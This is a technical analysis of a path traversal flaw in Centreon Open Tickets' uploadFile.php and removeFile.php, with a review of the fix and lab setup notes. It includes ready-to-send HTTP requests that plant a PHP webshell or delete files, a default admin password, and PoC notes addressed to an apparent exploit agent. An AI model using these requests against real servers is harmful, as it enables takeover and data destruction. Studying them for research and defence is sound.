# Vulnerability Analysis: CVE-2026-2749

## CVE Summary
| Field | Value |
|-------|-------|
| **CVE ID** | CVE-2026-2749 |
| **Vulnerability** | Path Traversal in Centreon Open Tickets File Upload/Remove Actions |
| **CVSS** | 9.9 Critical (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H) |
| **CWE** | CWE-22 — Improper Limitation of a Pathname to a Restricted Directory |
| **Affected Software** | Centreon Open Tickets < 25.10.3 / < 24.10.8 / < 24.04.7 |
| **Fix Commit** | `93782a36463a0dcd593adc28821e4693d527f108` |

---

## Root Cause

The vulnerability is a **classic path traversal** in two PHP files (`uploadFile.php` and `removeFile.php`) that handle file management for the Centreon Open Tickets module. Both files accept user-controlled filename/identifier parameters and use them directly in filesystem path construction without any sanitization, allowing directory traversal via `../` sequences.

### Specific Root Causes:

1. **uploadFile.php (Arbitrary File Write)**:
   - `$_REQUEST['uniqId']` is used directly without validation — no regex check, no `basename()`
   - `$file['name']` from `$_FILES` (the uploaded file's original filename sent by the client) is concatenated directly into the destination path — no `basename()` to strip directory components
   - Uses `rename()` instead of `move_uploaded_file()` — `rename()` does not verify the source is an actual PHP upload, making it more exploitable in certain configurations
   - No `realpath()` or directory containment check

2. **removeFile.php (Arbitrary File Deletion)**:
   - `$get_information['uniqId']` and `$get_information['filename']` come from user-controlled JSON body (`$_POST['data']`)
   - Both are concatenated directly into the `unlink()` path — no `basename()`, no regex validation
   - No `realpath()` or directory containment check
   - No verification that the file was actually uploaded in the current session (no session-based file tracking check)

---

## Vulnerable Files and Functions

### File 1: `uploadFile.php`
**Path**: `centreon-open-tickets/www/modules/centreon-open-tickets/views/rules/ajax/actions/uploadFile.php`
**Lines**: 24–39 (entire action file)

```php
// Line 24: uniqId taken directly from request without validation
$uniq_id = $_REQUEST['uniqId'];

// Line 25-27: file['name'] from $_FILES used directly (attacker-controlled filename)
foreach ($_FILES as $file) {
    $dir = dirname($file['tmp_name']);
    $file_dst = $dir . '/opentickets/' . $uniq_id . '__' . $file['name'];
    // Path traversal: if $file['name'] = "../../usr/share/centreon/www/shell.php"
    // then $file_dst = "/tmp/opentickets/UNIQID__../../usr/share/centreon/www/shell.php"
    // which resolves to /usr/share/centreon/www/shell.php

    @mkdir($dir . '/opentickets', 0750);
    if (rename($file['tmp_name'], $file_dst)) {  // rename() not move_uploaded_file()
        // ...session tracking with unsanitized path
    }
}
```

### File 2: `removeFile.php`
**Path**: `centreon-open-tickets/www/modules/centreon-open-tickets/views/rules/ajax/actions/removeFile.php`
**Lines**: 24–26 (entire action file)

```php
// Lines 24-26: Both uniqId and filename used directly in path construction
$temp_dir = sys_get_temp_dir();
unlink($temp_dir . '/opentickets/' . $get_information['uniqId'] . '__' . $get_information['filename']);
// Path traversal: if filename = "../../etc/passwd"
// then path = "/tmp/opentickets/UNIQID__../../etc/passwd"
// which resolves to /etc/passwd → DELETED
unset($_SESSION['ot_upload_files'][$get_information['uniqId']]);
```

---

## Entry Points

Both vulnerable files are included by the `call.php` router, which is reachable via **two URL paths**:

### Primary Entry Point
**File**: `centreon-open-tickets/www/modules/centreon-open-tickets/views/rules/ajax/call.php`
**URL**: `POST /centreon/modules/centreon-open-tickets/views/rules/ajax/call.php`

### Secondary Entry Point (Widget Proxy)
**File**: `centreon-open-tickets/widgets/open-tickets/src/ajax/callforwardmodule.php`
**URL**: `POST /centreon/widgets/open-tickets/src/ajax/callforwardmodule.php`

This file simply includes `call.php`:
```php
require_once $centreon_path . 'www/modules/centreon-open-tickets/views/rules/ajax/call.php';
```

### Router Logic (call.php)
```php
session_start();
// ... dependency injection ...
if (isset($_SESSION['centreon'])) {
    $centreon = $_SESSION['centreon'];
} else {
    exit;  // Session check — requires authenticated session
}

$get_information = isset($_POST['data']) ? json_decode($_POST['data'], true) : null;
$action = ! is_null($get_information) && isset($get_information['action'])
    ? $get_information['action'] : ($_REQUEST['action'] ?? 'none');

// Routes action to include file
include $actions[$action];
```

### Action Routing:
- **Upload**: `action=upload-file` → includes `uploadFile.php`
  - Input: `$_REQUEST['uniqId']` (query string) + `$_FILES` (multipart file upload)
- **Remove**: `action=remove-file` → includes `removeFile.php`
  - Input: `$_POST['data']` as JSON → `$get_information['uniqId']` + `$get_information['filename']`

---

## Triggering Input

### Attack Vector 1: Arbitrary File Write (RCE)

**HTTP Request:**
```http
POST /centreon/modules/centreon-open-tickets/views/rules/ajax/call.php?action=upload-file&uniqId=abcdef1234567 HTTP/1.1
Host: target.example.com
Cookie: PHPSESSID=<authenticated_session_cookie>
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="file"; filename="../../../usr/share/centreon/www/shell.php"
Content-Type: application/octet-stream

<?php system($_GET['cmd']); ?>
------Boundary--
```

**What happens:**
1. `$uniq_id` = `"abcdef1234567"` (from `$_REQUEST['uniqId']`)
2. `$file['name']` = `"../../../usr/share/centreon/www/shell.php"` (attacker-controlled)
3. `$file['tmp_name']` = `"/tmp/phpXXXXXX"` (PHP temp upload)
4. `$dir` = `"/tmp"` (dirname of tmp_name)
5. `$file_dst` = `"/tmp/opentickets/abcdef1234567__../../../usr/share/centreon/www/shell.php"`
6. `rename("/tmp/phpXXXXXX", "/tmp/opentickets/abcdef1234567__../../../usr/share/centreon/www/shell.php")`
7. Filesystem resolves to: `/usr/share/centreon/www/shell.php`
8. Webshell is now accessible at `http://target/centreon/shell.php`

**Alternative traversal via `uniqId`:**
The `uniqId` parameter is also unsanitized, so traversal can also happen through it:
```
uniqId=../../../usr/share/centreon/www/x
```
This creates: `/tmp/opentickets/../../../usr/share/centreon/www/x__normalfilename.txt`

### Attack Vector 2: Arbitrary File Deletion (DoS)

**HTTP Request:**
```http
POST /centreon/modules/centreon-open-tickets/views/rules/ajax/call.php HTTP/1.1
Host: target.example.com
Cookie: PHPSESSID=<authenticated_session_cookie>
Content-Type: application/x-www-form-urlencoded

data={"action":"remove-file","uniqId":"a","filename":"../../usr/share/centreon/www/index.php"}
```

**What happens:**
1. `$get_information['uniqId']` = `"a"`
2. `$get_information['filename']` = `"../../usr/share/centreon/www/index.php"`
3. `unlink("/tmp/opentickets/a__../../usr/share/centreon/www/index.php")`
4. Filesystem resolves to: `/usr/share/centreon/www/index.php` → **DELETED**

---

## Attack Scenario

### Scenario: Authenticated RCE via PHP Webshell Upload

**Prerequisites:**
- Any valid Centreon user account (even lowest-privilege, non-admin)
- Network access to the Centreon web interface

**Steps:**
1. **Authenticate** to Centreon via the web login form to obtain a `PHPSESSID` session cookie
   - POST to `/centreon/api/latest/login` with JSON body `{"security":{"credentials":{"login":"<user>","password":"<pass>"}}}`
   - Or POST to `/centreon/api/index.php?action=authenticate` with form data `username=<user>&password=<pass>`
   - Or simply POST to `/centreon/index.php` (standard form login) and capture the `PHPSESSID` cookie
2. **Upload a PHP webshell** by sending a multipart POST to the upload endpoint with a traversal filename:
   - URL: `/centreon/modules/centreon-open-tickets/views/rules/ajax/call.php?action=upload-file&uniqId=abcdef1234567`
   - File upload with `filename="../../../usr/share/centreon/www/shell.php"`
   - File content: `<?php system($_GET['cmd']); ?>`
3. **Execute commands** by accessing `http://target/centreon/shell.php?cmd=id`

### Scenario: Authenticated DoS via Config File Deletion

1. Authenticate as any user
2. Send a remove-file request targeting critical files:
   - `{"action":"remove-file","uniqId":"a","filename":"../../usr/share/centreon/www/index.php"}`
   - Or target `/etc/centreon-engine/centengine.cfg` to disrupt monitoring

---

## Impact

| Impact | Description |
|--------|-------------|
| **Remote Code Execution** | Attacker can write arbitrary PHP files to the web root, achieving full server compromise |
| **Arbitrary File Write** | Write to any path writable by the web server user (typically `apache` or `www-data`) |
| **Arbitrary File Deletion** | Delete any file readable by the web server user — DoS, data destruction |
| **Privilege Escalation** | Write cron jobs to `/etc/cron.d/` for root-level command execution |
| **Scope: Changed** | CVSS scope is "Changed" (S:C) because the web server user may write outside the Centreon application boundary |

---

## Authentication Requirements

The vulnerability **requires authentication** — `call.php` checks `$_SESSION['centreon']` and calls `exit` if not set.

### Authentication Flow for PoC:

**Method 1: Modern Symfony REST API (Preferred for PoC)**
```
POST /centreon/api/latest/login
Content-Type: application/json

{"security":{"credentials":{"login":"admin","password":"Centreon!2021"}}}
```
Response: JSON with `security.token` — this is an API token, NOT a PHP session cookie. This approach is for API calls using the `Centreon-Auth-Token` header.

**Method 2: Legacy API Authentication**
```
POST /centreon/api/index.php?action=authenticate
Content-Type: application/x-www-form-urlencoded

username=admin&password=Centreon!2021
```
Response: JSON `{"authToken":"<token>"}`

**Method 3: Standard Form Login (Required for this exploit)**
Since the vulnerable endpoints use `$_SESSION['centreon']` (PHP session-based auth), the PoC must obtain a PHP session cookie:
```
POST /centreon/index.php
Content-Type: application/x-www-form-urlencoded

useralias=admin&password=Centreon!2021&submitLogin=Connect
```
The response sets a `PHPSESSID` cookie which must be included in subsequent requests to the vulnerable endpoints.

**Default Credentials**: `admin` / `Centreon!2021` (default Centreon installation password)

**Key Detail**: The vulnerable endpoint authenticates via **PHP session** (`$_SESSION['centreon']`), NOT via API token headers. The PoC must use session-cookie-based authentication (Method 3 or any method that establishes a PHP session).

---

## Fix Assessment

The fix in commit `93782a36463a0dcd593adc28821e4693d527f108` is **thorough and complete**. It implements defense-in-depth with multiple layers:

### Fix Details — uploadFile.php:
1. **Session validation**: Re-checks `$_SESSION['centreon']` (defense-in-depth, call.php already checks)
2. **uniqId validation**: `preg_match('/^[a-f0-9]{13}(\.[0-9]{8})?$/D', $uniq_id)` — strict hex format, no special chars
3. **Filename sanitization**: `basename($file['name'])` strips all directory components
4. **Filename validation**: Rejects `.`, `..`, empty, control chars (`\x00-\x1f\x7f`), names > 200 chars
5. **Directory creation**: Proper `is_dir()` + `mkdir()` with race condition handling
6. **Path validation**: `realpath(dirname($file_dst))` compared to `realpath($target_dir)` — ensures destination stays in target directory
7. **Upload verification**: Uses `move_uploaded_file()` instead of `rename()` — PHP verifies the source is a genuine HTTP upload

### Fix Details — removeFile.php:
1. **Session validation**: `$_SESSION['centreon']` check
2. **uniqId validation**: Same strict regex
3. **Filename sanitization**: `basename()` on filename parameter
4. **Path validation**: `realpath()` + `str_starts_with()` containment check
5. **Session-based file tracking**: Verifies `$_SESSION['ot_upload_files'][$uniq_id][$real_file_path]` exists before allowing deletion — prevents deleting files that weren't uploaded in the current session
6. **Error handling**: Proper error responses instead of silent failures

### Fix Completeness Assessment:
- ✅ `basename()` prevents all `../` traversal in filenames
- ✅ Strict regex on `uniqId` prevents traversal through that parameter
- ✅ `realpath()` + directory containment check provides second layer of defense
- ✅ `move_uploaded_file()` prevents non-upload file manipulation
- ✅ Session-based file tracking prevents arbitrary deletion
- ✅ Control character filtering prevents null-byte injection
- ✅ Both vulnerable parameters are sanitized (not just one)
- ✅ Both vulnerable files are fixed

The fix addresses the root cause comprehensively. No bypass is apparent.

---

## Related Attack Surface

### Secondary Entry Point (Same Vulnerability)
**File**: `centreon-open-tickets/widgets/open-tickets/src/ajax/callforwardmodule.php`
This is a thin wrapper that includes `call.php`, providing an alternative URL to reach the same vulnerable endpoints:
- `POST /centreon/widgets/open-tickets/src/ajax/callforwardmodule.php?action=upload-file&uniqId=...`
- `POST /centreon/widgets/open-tickets/src/ajax/callforwardmodule.php` (with `data` JSON body for remove-file)

Since the fix is in `uploadFile.php` and `removeFile.php` (the included files), this entry point is also fixed by the same commit.

### clearUploadFiles() in AbstractProvider
**File**: `centreon-open-tickets/www/modules/centreon-open-tickets/providers/Abstract/AbstractProvider.class.php`
**Lines**: 193–201

```php
public function clearUploadFiles(): void {
    $upload_files = $this->getUploadFiles();
    foreach ($upload_files as $file) {
        unlink($file['filepath']);  // Deletes files from session tracking
    }
    unset($_SESSION['ot_upload_files'][$this->uniq_id]);
}
```

This function calls `unlink()` using file paths stored in `$_SESSION['ot_upload_files']`. In the **vulnerable version**, an attacker could first upload a file with a traversal path (which gets stored in the session as the full traversal path), and then submit a ticket — the `clearUploadFiles()` would attempt to unlink that traversal path. However, this is not an independent vulnerability — it depends on the upload path already being poisoned via `uploadFile.php`. The fix to `uploadFile.php` prevents traversal paths from entering the session, so this code path is also protected.

### Other File Upload Code in Centreon Core
- `centreon/src/Centreon/Infrastructure/Service/UploadFileService.php` — Uses a proper upload service class; not vulnerable to the same pattern
- `centreon/www/include/options/media/images/formImg.php` — Different file handling mechanism; not examined in detail but separate from the Open Tickets module

**No additional instances of the same vulnerability pattern were found in the Open Tickets module.**

---

## Build System & Lab Requirements

### Build System
| Field | Value |
|-------|-------|
| **Language** | PHP 8.2 |
| **Build System** | Composer (PHP package manager) + nfpm (RPM/DEB packaging) |
| **Module Type** | Standalone PHP module (no compilation needed) |

### Build Commands
The Open Tickets module is pure PHP — no compilation required. It is deployed by copying PHP files to the Centreon web directory:
```bash
# No build step needed — the PHP files are used directly
# For packaging: composer install (for dependencies)
cd centreon-open-tickets
composer install --no-dev
```

### Dependencies

**System packages (for full Centreon stack):**
- PHP 8.2 with extensions: session, json, curl, fileinfo, mbstring, pdo, pdo_mysql
- Apache httpd with mod_php or php-fpm
- MariaDB 10.11 (Centreon configuration database)

**For minimal PoC lab (recommended):**
- PHP 8.2 with built-in server OR Apache + mod_php
- Session support (PHP default)
- `$_FILES` handling (PHP default)
- No database needed for the vulnerable code path itself

### Runtime Requirements

**Full Centreon stack:**
- Centreon Web application installed and configured
- MariaDB database with Centreon schema
- Apache httpd serving the application
- Open Tickets module installed and active
- At least one user account for authentication

**Minimal reproduction lab (recommended for PoC):**
- PHP 8.2 with built-in web server
- A minimal `call.php` wrapper that:
  1. Starts a session
  2. Sets `$_SESSION['centreon']` to simulate authentication
  3. Routes to the vulnerable action files
- The two vulnerable files: `uploadFile.php` and `removeFile.php`
- A `/tmp/opentickets/` directory (created by the upload action)

### Docker Lab Strategy

**Recommended approach**: Minimal PHP reproduction container
- **Base image**: `php:8.2-apache` (Debian-based, has all needed PHP extensions)
- **Setup**: Copy only the vulnerable PHP files + a minimal router
- **No database needed** — the vulnerable code path doesn't touch the database
- **Mock authentication** — set `$_SESSION['centreon']` to a truthy value in the test harness

**Alternative approach**: Full Centreon stack
- Use `almalinux:9` base image
- Install Centreon from RPM packages (https://docs.centreon.com/docs/installation/introduction/)
- Install Open Tickets module
- This is heavier but more realistic

### Key Paths
| Path | Description |
|------|-------------|
| Install prefix | `/usr/share/centreon/` |
| Web root | `/usr/share/centreon/www/` |
| Vulnerable files | `/usr/share/centreon/www/modules/centreon-open-tickets/views/rules/ajax/actions/` |
| Entry point | `/usr/share/centreon/www/modules/centreon-open-tickets/views/rules/ajax/call.php` |
| Alt entry point | `/usr/share/centreon/www/widgets/open-tickets/src/ajax/callforwardmodule.php` |
| Temp upload dir | `/tmp/opentickets/` (sys_get_temp_dir() + '/opentickets') |

---

## PoC Strategy Notes

For the PoC agent:
1. **File Write PoC**: Upload a file with `filename="../../../../tmp/cve_2026_2749_proof.txt"` via the upload endpoint. Verify the file appears at `/tmp/cve_2026_2749_proof.txt` (outside the opentickets directory).
2. **RCE PoC (if full stack)**: Upload a PHP webshell to the web root via traversal, then execute it via HTTP.
3. **File Delete PoC**: Create a canary file, then delete it via the remove endpoint with traversal in the filename parameter.
4. **Both `uniqId` and `filename` are exploitable** — the traversal can go through either parameter.
5. **The minimal lab approach is strongly recommended** — the vulnerable code has no database dependencies.
